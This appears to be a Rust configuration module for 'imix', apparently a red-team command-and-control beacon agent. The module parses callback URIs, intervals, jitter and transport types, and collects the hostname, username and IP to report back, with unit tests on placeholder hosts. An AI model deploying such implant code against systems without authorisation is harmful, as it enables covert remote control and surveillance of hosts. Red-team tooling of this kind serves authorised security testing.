use anyhow::Context;
use host_unique::HostIDSelector;
use url::Url;
use uuid::Uuid;

use crate::c2::{AvailableTransports, Transport};

//TODO: Can this struct be removed?
/// Config holds values necessary to configure an Agent.
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Config {
    #[prost(message, optional, tag = "1")]
    pub info: ::core::option::Option<crate::c2::Beacon>,
    #[prost(bool, tag = "2")]
    pub run_once: bool,
}

macro_rules! callback_uri {
    () => {
        match option_env!("IMIX_CALLBACK_URI") {
            Some(uri) => uri,
            None => "http://127.0.0.1:8000",
        }
    };
}

/*
 * Compile-time constant for the agent callback URI, derived from the IMIX_CALLBACK_URI environment variable during compilation.
 * Defaults to "http://127.0.0.1:8000/grpc" if this is unset.
 */
pub const CALLBACK_URI: &str = callback_uri!();

macro_rules! callback_interval {
    () => {
        match option_env!("IMIX_CALLBACK_INTERVAL") {
            Some(interval) => interval,
            None => "5",
        }
    };
}
/* Compile-time constant for the agent callback interval, derived from the IMIX_CALLBACK_INTERVAL environment variable during compilation.
 * Defaults to 5 if unset.
 */
pub const CALLBACK_INTERVAL: &str = callback_interval!();

macro_rules! retry_interval {
    () => {
        match option_env!("IMIX_RETRY_INTERVAL") {
            Some(interval) => interval,
            None => "5",
        }
    };
}
/* Compile-time constant for the agent callback interval, derived from the IMIX_CALLBACK_INTERVAL environment variable during compilation.
 * Defaults to 5 if unset.
 */
pub const RETRY_INTERVAL: &str = retry_interval!();

macro_rules! run_once {
    () => {
        match option_env!("IMIX_RUN_ONCE") {
            Some(_) => true,
            None => false,
        }
    };
}

macro_rules! extra {
    () => {
        match option_env!("IMIX_TRANSPORT_EXTRA") {
            Some(extra) => extra,
            None => "",
        }
    };
}

/* Default extra config value */
const DEFAULT_EXTRA_CONFIG: &str = extra!();

/* Compile-time constant for the agent run once flag, derived from the IMIX_RUN_ONCE environment variable during compilation.
 * Defaults to false if unset.
 */
pub const RUN_ONCE: bool = run_once!();

/*
 * Helper function to determine transport type from URI scheme
 */
fn get_transport_type(uri: &str) -> crate::c2::transport::Type {
    match uri.split(":").next().unwrap_or("unspecified") {
        "dns" => crate::c2::transport::Type::TransportDns,
        "http1" => crate::c2::transport::Type::TransportHttp1,
        "https1" => crate::c2::transport::Type::TransportHttp1,
        "https" => crate::c2::transport::Type::TransportGrpc,
        "http" => crate::c2::transport::Type::TransportGrpc,
        _ => crate::c2::transport::Type::TransportUnspecified,
    }
}

/*
 * Helper function to parse URIs into Transport objects
 * Supports DSN format with query parameters:
 * - interval: callback interval in seconds (overrides default)
 * - extra: extra configuration JSON (overrides default)
 * - jitter: callback jitter float [0.0, 1.0] (overrides default 0.0)
 *
 * Example: https://example.com?interval=10&extra={"key":"value"}&jitter=0.5
 */
fn parse_transports(uri_string: &str) -> Vec<Transport> {
    uri_string
        .split(';')
        .filter(|s| !s.trim().is_empty())
        .filter_map(|uri| {
            let uri_trimmed = uri.trim();
            parse_dsn(uri_trimmed).ok()
        })
        .collect()
}

/*
 * Helper function to parse DSN query parameters
 * Returns a Transport struct
 */
fn parse_dsn(uri: &str) -> anyhow::Result<Transport> {
    // Parse as a URL to extract query parameters
    let parsed_url = Url::parse(uri).with_context(|| format!("Failed to parse URI '{}'", uri))?;

    let mut interval = parse_callback_interval()?;
    let mut extra = DEFAULT_EXTRA_CONFIG.to_lowercase();
    let mut jitter = 0.0;

    // Parse query parameters
    for (key, value) in parsed_url.query_pairs() {
        match key.as_ref() {
            "interval" => {
                interval = value
                    .parse::<u64>()
                    .with_context(|| format!("Failed to parse interval parameter '{}'", value))?;
            }
            "extra" => {
                extra = value.to_lowercase();
            }
            "jitter" => {
                jitter = value
                    .parse::<f32>()
                    .with_context(|| format!("Failed to parse jitter parameter '{}'", value))?;
            }
            _ => {
                #[cfg(debug_assertions)]
                log::debug!("Ignoring unknown query parameter: {}", key);
            }
        }
    }

    // Reconstruct the base URI without query parameters
    let mut base_uri = parsed_url.clone();
    base_uri.set_query(None);

    Ok(Transport {
        uri: base_uri.to_string(),
        interval,
        r#type: get_transport_type(uri) as i32,
        extra,
        jitter,
    })
}

/*
 * Helper function to parse callback interval with fallback
 */
fn parse_callback_interval() -> anyhow::Result<u64> {
    CALLBACK_INTERVAL.parse::<u64>().with_context(|| {
        format!(
            "Failed to parse callback interval constant '{}'",
            CALLBACK_INTERVAL
        )
    })
}

fn parse_host_unique_selectors() -> Vec<Box<dyn HostIDSelector>> {
    let final_res = match option_env!("IMIX_UNIQUE") {
        Some(json) => {
            if let Some(res) = host_unique::from_imix_unique(json.to_owned()) {
                return res;
            } else {
                #[cfg(debug_assertions)]
                log::error!(
                    "Error parsing uniqueness string (should have been caught at build time"
                );
                return host_unique::defaults();
            }
        }
        None => host_unique::defaults(),
    };
    final_res
}

/*
 * Config methods.
 */
impl Config {
    pub fn default_with_imix_version(imix_version: &str) -> Self {
        let agent = crate::c2::Agent {
            identifier: format!("imix-v{}", imix_version),
        };

        let selectors = parse_host_unique_selectors();

        let host = crate::c2::Host {
            name: whoami::fallible::hostname().unwrap_or(String::from("")),
            identifier: host_unique::get_id_with_selectors(selectors).to_string(),
            platform: get_host_platform() as i32,
            primary_ip: get_primary_ip(),
        };

        // Try to grab the beacon identitifier from env var, o/w use  a random UUID
        let beacon_id =
            std::env::var("IMIX_BEACON_ID").unwrap_or_else(|_| String::from(Uuid::new_v4()));

        // Parse CALLBACK_URI by splitting on ';' to support multiple transports
        let transports = parse_transports(CALLBACK_URI);

        // Create AvailableTransports with the 0th element as the first active transport
        let available_transports = AvailableTransports {
            transports,
            active_index: 0,
        };

        let info = crate::c2::Beacon {
            identifier: beacon_id,
            principal: whoami::username(),
            available_transports: Some(available_transports),
            host: Some(host),
            agent: Some(agent),
        };

        Config {
            info: Some(info),
            run_once: RUN_ONCE,
        }
    }
    pub fn refresh_primary_ip(&mut self) {
        let fresh_ip = get_primary_ip();
        if self
            .info
            .clone()
            .is_some_and(|b| b.host.as_ref().is_some_and(|h| h.primary_ip != fresh_ip))
        {
            match self.info.clone() {
                Some(mut b) => match b.host.as_mut() {
                    Some(h) => {
                        h.primary_ip = fresh_ip;
                    }
                    None => {
                        #[cfg(debug_assertions)]
                        log::error!("host struct was never initialized, failed to set primary ip");
                    }
                },
                None => {
                    #[cfg(debug_assertions)]
                    log::error!("beacon struct was never initialized, failed to set primary ip");
                }
            }
        }
    }
}

/*
 * Returns which Platform imix has been compiled for.
 */
fn get_host_platform() -> crate::c2::host::Platform {
    #[cfg(target_os = "linux")]
    return crate::c2::host::Platform::Linux;

    #[cfg(target_os = "macos")]
    return crate::c2::host::Platform::Macos;

    #[cfg(target_os = "windows")]
    return crate::c2::host::Platform::Windows;

    #[cfg(any(target_os = "freebsd", target_os = "netbsd", target_os = "openbsd"))]
    return crate::c2::host::Platform::Bsd;

    #[cfg(all(
        not(target_os = "linux"),
        not(target_os = "macos"),
        not(target_os = "windows"),
        not(target_os = "freebsd"),
        not(target_os = "netbsd"),
        not(target_os = "openbsd"),
    ))]
    return crate::c2::host::Platform::Unspecified;
}

/*
 * Return the first IPv4 address of the default interface as a string.
 * Returns the empty string otherwise.
 */
fn get_primary_ip() -> String {
    match netdev::get_default_interface() {
        Ok(default_interface) => match default_interface.ipv4.first() {
            Some(ip) => ip.addr().to_string(),
            None => String::from(""),
        },
        Err(_err) => {
            #[cfg(debug_assertions)]
            log::error!("failed to get primary ip: {_err}");

            String::from("")
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const DEFAULT_INTERVAL_SECONDS: u64 = 5;

    #[test]
    fn test_single_uri_parsing() {
        // Simulating a single URI at compile time
        let config = Config::default_with_imix_version("test");

        let info = config.info.expect("Config should have info");
        let available = info
            .available_transports
            .expect("Should have available transports");

        assert_eq!(available.transports.len(), 1);
        assert_eq!(available.active_index, 0);
        // The URL crate normalizes URIs, potentially adding trailing slashes
        assert!(available.transports[0]
            .uri
            .starts_with("http://127.0.0.1:8000"));
    }

    #[test]
    fn test_transport_type_detection_grpc() {
        let grpc_type = get_transport_type("http://example.com");
        assert_eq!(grpc_type, crate::c2::transport::Type::TransportGrpc);

        let grpcs_type = get_transport_type("https://example.com");
        assert_eq!(grpcs_type, crate::c2::transport::Type::TransportGrpc);
    }

    #[test]
    fn test_transport_type_detection_http1() {
        let http1_type = get_transport_type("http1://example.com");
        assert_eq!(http1_type, crate::c2::transport::Type::TransportHttp1);

        let https1_type = get_transport_type("https1://example.com");
        assert_eq!(https1_type, crate::c2::transport::Type::TransportHttp1);
    }

    #[test]
    fn test_transport_type_detection_dns() {
        let dns_type = get_transport_type("dns://8.8.8.8");
        assert_eq!(dns_type, crate::c2::transport::Type::TransportDns);
    }

    #[test]
    fn test_transport_type_detection_unspecified() {
        let unknown_type = get_transport_type("ftp://example.com");
        assert_eq!(
            unknown_type,
            crate::c2::transport::Type::TransportUnspecified
        );
    }

    #[test]
    fn test_parse_callback_interval_valid() {
        let interval = parse_callback_interval().expect("Failed to parse callback interval");
        // Should parse successfully or default to DEFAULT_INTERVAL_SECONDS
        assert!(interval >= DEFAULT_INTERVAL_SECONDS);
    }

    #[test]
    fn test_config_creates_available_transports() {
        let config = Config::default_with_imix_version("v2");

        assert!(config.info.is_some());
        let info = config.info.unwrap();
        assert!(info.available_transports.is_some());

        let available = info.available_transports.unwrap();
        assert!(
            !available.transports.is_empty(),
            "Should have at least one transport"
        );
        assert_eq!(available.active_index, 0, "Active index should be 0");
    }

    #[test]
    fn test_empty_uri_filtered() {
        // Test that empty URIs are filtered out using parse_transports
        let uris = "http://example.com;;https://example2.com";
        let transports = parse_transports(uris);

        assert_eq!(transports.len(), 2);
        assert_eq!(transports[0].uri, "http://example.com/");
        assert_eq!(transports[1].uri, "https://example2.com/");
    }

    #[test]
    fn test_dsn_with_interval_query_param() {
        // Test DSN parsing with interval query parameter
        let uris = "https://example.com?interval=10";
        let transports = parse_transports(uris);

        assert_eq!(transports.len(), 1);
        assert_eq!(transports[0].uri, "https://example.com/");
        assert_eq!(transports[0].interval, 10);
        assert_eq!(transports[0].extra, "");
    }

    #[test]
    fn test_dsn_with_extra_query_param() {
        // Test DSN parsing with extra query parameter (converted to lowercase)
        let uris = "https://example.com?extra=%7B%22key%22%3A%22value%22%7D";
        let transports = parse_transports(uris);

        assert_eq!(transports.len(), 1);
        assert_eq!(transports[0].uri, "https://example.com/");
        assert_eq!(transports[0].interval, DEFAULT_INTERVAL_SECONDS);
        assert_eq!(transports[0].extra, r#"{"key":"value"}"#);
    }

    #[test]
    fn test_dsn_with_both_query_params() {
        // Test DSN parsing with both interval and extra query parameters (extra converted to lowercase)
        let uris = "https://example.com?interval=15&extra=%7B%22proxy%22%3A%22http%3A%2F%2Fproxy.local%22%7D";
        let transports = parse_transports(uris);

        assert_eq!(transports.len(), 1);
        assert_eq!(transports[0].uri, "https://example.com/");
        assert_eq!(transports[0].interval, 15);
        assert_eq!(transports[0].extra, r#"{"proxy":"http://proxy.local"}"#);
    }

    #[test]
    fn test_dsn_multiple_uris_with_different_params() {
        // Test multiple DSNs with different parameters
        let uris = "https://primary.com?interval=10;https://fallback.com?interval=30";
        let transports = parse_transports(uris);

        assert_eq!(transports.len(), 2);
        assert_eq!(transports[0].uri, "https://primary.com/");
        assert_eq!(transports[0].interval, 10);
        assert_eq!(transports[1].uri, "https://fallback.com/");
        assert_eq!(transports[1].interval, 30);
    }

    #[test]
    fn test_dsn_no_query_params_uses_defaults() {
        // Test that URIs without query parameters use default values
        let uris = "https://example.com";
        let transports = parse_transports(uris);

        assert_eq!(transports.len(), 1);
        assert_eq!(transports[0].uri, "https://example.com/");
        assert_eq!(transports[0].interval, DEFAULT_INTERVAL_SECONDS);
        assert_eq!(transports[0].extra, DEFAULT_EXTRA_CONFIG.to_lowercase());
    }

    #[test]
    fn test_dsn_invalid_interval_uses_default() {
        // Test that invalid interval values are filtered out (error bubbles up)
        let uris = "https://example.com?interval=invalid";
        let transports = parse_transports(uris);

        // Since parse_dsn now returns Result and invalid intervals bubble up errors,
        // the filter_map will filter out this entry
        assert_eq!(transports.len(), 0);
    }

    #[test]
    fn test_dsn_mixed_with_and_without_params() {
        // Test mixed URIs (some with params, some without)
        let uris = "https://first.com?interval=10;https://second.com;https://third.com?interval=25";
        let transports = parse_transports(uris);

        assert_eq!(transports.len(), 3);
        assert_eq!(transports[0].interval, 10);
        assert_eq!(transports[1].interval, DEFAULT_INTERVAL_SECONDS); // Uses default
        assert_eq!(transports[2].interval, 25);
    }

    #[test]
    fn test_dsn_with_unencoded_json() {
        // Test DSN parsing with unencoded JSON in extra parameter
        // The url crate should handle the parsing automatically
        let uris =
            r#"https://example.com?interval=20&extra={"key":"value","nested":{"Foo":"Bar"}}"#;
        let transports = parse_transports(uris);

        assert_eq!(transports.len(), 1);
        assert_eq!(transports[0].uri, "https://example.com/");
        assert_eq!(transports[0].interval, 20);
        assert_eq!(
            transports[0].extra,
            r#"{"key":"value","nested":{"foo":"bar"}}"#
        );
    }

    #[test]
    fn test_dsn_with_jitter() {
        let uris = "https://example.com?jitter=0.5";
        let transports = parse_transports(uris);

        assert_eq!(transports.len(), 1);
        assert_eq!(transports[0].uri, "https://example.com/");
        assert_eq!(transports[0].jitter, 0.5);
    }
}
